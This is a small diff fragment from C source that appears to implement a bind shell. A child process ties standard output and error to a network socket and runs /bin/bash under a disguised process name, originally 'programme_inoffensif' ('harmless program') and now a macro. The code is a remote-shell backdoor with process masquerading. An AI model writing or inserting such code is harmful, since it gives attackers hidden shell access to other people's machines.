@@ -54,7 +54,7 @@ void childExec(void *sockfd) {
   dup2(newsockfd, STDOUT_FILENO);
   dup2(newsockfd, STDERR_FILENO);
 
-  sexecl("/bin/bash", "programme_inoffensif", NULL);
+  sexecl("/bin/bash", NOM_PROG, NULL);
 }
 
 // establish a passive sock connection
